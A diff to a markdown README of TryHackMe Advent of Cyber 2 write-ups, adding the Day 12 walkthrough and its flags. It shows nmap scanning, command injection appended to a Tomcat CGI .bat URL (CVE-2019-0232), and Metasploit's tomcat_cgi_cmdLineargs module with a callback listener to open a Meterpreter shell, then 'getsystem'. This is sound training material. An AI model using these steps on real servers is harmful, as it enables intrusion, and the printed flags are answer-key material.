@@ -19,7 +19,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 - [[Day 9] Anyone can be Santa!](#day-9-anyone-can-be-santa)
 - [[Day 10] Don't be sElfish!](#day-10-dont-be-selfish)
 - [[Day 11] The Rogue Gnome](#day-11-the-rogue-gnome)
-- [[Day 12] ](#day-12-)
+- [[Day 12] Ready, set, elf.](#day-12-eady-set-elf)
 - [[Day 13] ](#day-13-)
 - [[Day 14] ](#day-14-)
 - [[Day 15] ](#day-15-)
@@ -628,11 +628,124 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
    
    Using `GTFOBins` we can find out which of these binaries can be used for privelege escalation. Looks like `bash` is an intersting candidate. Unfortunately, I made some mistakes with the command, so it didn't work for me at first. This threw me of a little and sent me in the wrong direction as I tried to upload the `LinEnum.sh` script to the machine and execute it. This also didn't give anything. But I will list the steps I took as a PoC
    
-   [](https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation)
-
+   [Bash -p command explained](https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation)
+   
    ><details><summary>Click for answer</summary>thm{2fb10afe933296592}</details>
 
-### [Day 12] []()
+### [Day 12] [Ready, set, elf.](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2012)
+
+In this task we will be using MetaSploit to get access to our target machine.
+
+1. What is the version number of the web server?
+
+   First we need to find the port for the webserver. Using `nmap` didn't yield any result, so it is probably blocked somehow. So we add the `-Pn` argument to assume the host is up.
+   
+   ```cmd
+   nmap -sV 10.10.1.196 -Pn
+   ```
+   
+   [Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Nmap.png)
+   
+   Navigating to the webserver, we can find the version of the server.
+   
+   [Server Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Server_Version.png)
+
+   ><details><summary>Click for answer</summary>9.0.17</details>
+
+2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
+
+   To find out which CVE we can exploit we can use any of the following sites:
+   
+   - [Rapid7](http://rapid7.com/)
+   - [AttackerKB](https://attackerkb.com/)
+   - [MITRE](https://cve.mitre.org/cve/)
+   - [Exploit-DB](http://exploit-db.com/)
+
+   Her we can find which CVE we can exploit.
+   
+   ![CVE Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Exploit_CVE.png)
+
+   ><details><summary>Click for answer</summary>CVE-2019-0232</details>
+
+4. What are the contents of flag1.txt
+
+   To find the flag I tried using the CGI browser exploit mentioned in the challenge. Appending an extra argument to a script located on the server. This mainly works as we know (roughly) what to look for. Assuming the scripts are located in the `/cgi-bin/` directory, we can navigate to the script (if it exists).
+   
+   ![CGI Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Script.png)
+   
+   Appending the `?&dir` command, we can indeed parse extra information from the server. Apparently, the flag is located in the same folder.
+   
+   ![CGI Dir](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Dir.png)
+   
+   Maybe we can get the file contents from here directly. After encoding `type flag.txt` in CyberChef, I tried appending this to the URL.
+   
+   ![Cyber Chef Encode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_URL_Encode.png)
+   
+   ![CGI Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Type.png)
+   
+   Unfortunately, it didn't seem to work. So I had to try a different method. Enter MetaSploit!
+   
+   Using the information gathered, we can search MetaSploit for any usefull modules. Open MetaSploit using `msfconsole`. Since we know we are working with an Apache server and cgi vulnerabilities (from the CVE), we can use the following:
+   
+   ``cmd
+   search apache cgi
+   ```
+   
+   ![MSF Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Search.png)
+   
+   #2 looks to be what we are looking for. `enableCmdLineArguments` is also mentioned in the CVE. Next we run:
+   
+   ```cmd
+   use exploit/windows/http/tomcat_cgi_cmdLineargs
+   ```
+   
+   Now we need to view our options and set the correct parameters.
+   
+   ```cmd
+   options
+   set targeturi /cgi-cin/elfwhacker.bat
+   set lhost 10.18.78.136
+   set lport 1337
+   set rhost 10.10.1.196
+   options
+   ```
+   
+   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Options.png)
+   
+   So we can just use `run` to let the exploit start. This gives us a nice session which we can move into with `shell`.
+   
+   ![MSF Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Run.png)
+   
+   Now we can enumerate the directory and view the contents of the flag (`type` does work here fortunately).
+   
+   ![MSF Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Flag1.png)
+   
+   ><details><summary>Click for answer</summary>thm{whacking_all_the_elves}</details>
+
+5. Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!
+
+   Unfortunately, I couldn't get this to work with the post exploit scripts as mentioned in the hint. I did, however, manage to use `getsystem` to gain admin priveleges.
+   
+   ![Get System](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Get_System.png)
+   
+   The first method I used (which didn't work yet) was as follows:
+   
+   `search exploit suggest` this gave us the exploit suggestion module.
+   
+   ![MSF Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest.png)
+   
+   For this modules we only needed to add our session number.
+   
+   ![MSF Suggester Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest_Options.png)
+   
+   Unfortunately, I couldn't get it to connect. I will have to look at some Priv Esc rooms for this one.
+   
+   Some more resources I used:
+
+   - [Getsystem command for Metasploit - Priv Esc](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
+   - [Windows privilege escalation - Reddit](https://www.reddit.com/r/HowToHack/comments/6zxh68/looking_for_some_help_with_windows_privilege/)
+
+### [Day 13] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2013)
 
 
 
@@ -640,7 +753,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 13] []()
+### [Day 14] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2014)
 
 
 
@@ -648,7 +761,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 14] []()
+### [Day 15] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2015)
 
 
 
@@ -656,7 +769,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 15] []()
+### [Day 16] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2016)
 
 
 
@@ -664,7 +777,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 16] []()
+### [Day 17] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2017)
 
 
 
@@ -672,7 +785,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 17] []()
+### [Day 18] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2018)
 
 
 
@@ -680,7 +793,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 18] []()
+### [Day 19] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2019)
 
 
 
@@ -688,7 +801,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 19] []()
+### [Day 20] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2020)
 
 
 
@@ -696,7 +809,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 20] []()
+### [Day 21] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2021)
 
 
 
@@ -704,7 +817,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 21] []()
+### [Day 22] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2022)
 
 
 
@@ -712,7 +825,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 22] []()
+### [Day 23] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2023)
 
 
 
@@ -720,15 +833,7 @@ some checklists that can be used as a cheatsheet for the enumeration stage of pr
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 23] []()
-
-
-
-1. 
-
-   ><details><summary>Click for answer</summary></details>
-
-### [Day 24] []()
+### [Day 24] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2024)
 
 
 
